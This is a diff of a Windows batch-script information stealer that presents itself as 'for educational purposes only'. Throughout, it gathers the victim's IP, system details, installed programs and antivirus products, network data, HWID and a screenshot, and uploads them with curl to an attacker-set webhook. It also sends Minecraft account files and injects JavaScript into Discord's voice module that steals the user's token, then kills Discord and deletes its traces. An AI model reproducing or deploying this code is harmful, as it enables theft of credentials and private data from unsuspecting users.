@@ -1,3 +1,5 @@
+
+   
 @echo off
 :: i dont take any responsibility for damage done with the programm it's for educational purposes only
 ::replace the YOURWEBHOOK field with your webhook
@@ -7,32 +9,33 @@ set webhook=YOURWEBHOOK
 set /a killdc = 0
 
 ::get ip
-curl -o %userprofile%\AppData\Local\Temp\ip.txt https://myexternalip.com/raw >NUL
-set /p ip=<%userprofile%\AppData\Local\Temp\ip.txt
+curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
+set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
 
 ::gets a list of all installed programms
-powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt " >NUL
+powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "
 
 ::gets a list of all instaled antivirus
-WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List >%userprofile%\AppData\Local\Temp\antivirus.txt >NUL
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List >%userprofile%\AppData\Local\Temp\antivirus.txt
 
 ::gets system informations
-echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
-wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
-echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
-wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
-echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
-wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
-systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt >NUL
+echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
+wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
+echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
+wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt
+echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
+wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
+systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
 wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
-set /p hwid=<%userprofile%\AppData\Local\Temp\uuid.txt
 
+
+:aftertesti
 
 ::gets the ipconfig (also local ip)
-ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt >NUL
+ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
 
 ::gets the info about the netstat
-netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt >NUL
+netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
 
 ::sends the launcher_accounts.json if minecraft exist
 if exist %userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json %web% && goto end
@@ -64,19 +67,22 @@ echo $result  = "%webhook%"  >>%userprofile%\AppData\Local\Temp\test.ps1
 echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1															
 echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
 timeout 1 >NUL
-Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 >NUL
+Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 
 
 ::sends the username, ip, current time, and date of the victim
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername% HWID = %hwid%\"}" %webhook%  >NUL
 
+
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
 
 ::sends all files
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\antivirus.txt %webhook% >NUL
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\System_INFO.txt %webhook% >NUL
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\sysi.txt %webhook% >NUL
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ip.txt %webhook% >NUL
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\netstat.txt %webhook% >NUL
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\programms.txt %webhook% >NUL
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\antivirus.txt %webhook%
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\System_INFO.txt %webhook%
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\sysi.txt %webhook% 
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ip.txt %webhook% 
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\netstat.txt %webhook% 
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\programms.txt %webhook%
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\uuid.txt %webhook%
+ 
 
 ::grabbs the token
 
@@ -153,25 +159,26 @@ set /a voice=%voice%+1
 if %voice% == 99 goto e
 goto a
 :b 
-echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js >NUL
+echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js 
 if %killdc% == 1 goto d
 goto e
 :d
 ::coded by baum#2873
 ::kills discord if enabeld
-taskkill /im discord.exe /f >NUL
+taskkill /im discord.exe /f 
 :e
 
 
 
 ::deletes all temp files
-del %userprofile%\AppData\Local\Temp\ip.txt >NUL
-del %userprofile%\AppData\Local\Temp\sysi.txt >NUL
-del %userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
-del %userprofile%\AppData\Local\Temp\netstat.txt >NUL
-del %userprofile%\AppData\Local\Temp\antivirus.txt >NUL
-del %userprofile%\AppData\Local\Temp\test.ps1 >NUL
-del %userprofile%\AppData\Local\Temp\programms.txt >NUL
-del %userprofile%\AppData\Local\Temp\%username%_Capture.jpg >NUL
-del %userprofile%\AppData\Local\Temp\uuid.txt >NUL
-del %userprofile%\AppData\Local\Temp\testtttt.ps1 >NUL
+del %userprofile%\AppData\Local\Temp\ip.txt 
+del %userprofile%\AppData\Local\Temp\ipp.txt 
+del %userprofile%\AppData\Local\Temp\sysi.txt 
+del %userprofile%\AppData\Local\Temp\System_INFO.txt 
+del %userprofile%\AppData\Local\Temp\netstat.txt 
+del %userprofile%\AppData\Local\Temp\antivirus.txt
+del %userprofile%\AppData\Local\Temp\test.ps1 
+del %userprofile%\AppData\Local\Temp\programms.txt 
+del %userprofile%\AppData\Local\Temp\%username%_Capture.jpg
+del %userprofile%\AppData\Local\Temp\uuid.txt
+del %userprofile%\AppData\Local\Temp\testtttt.ps1 
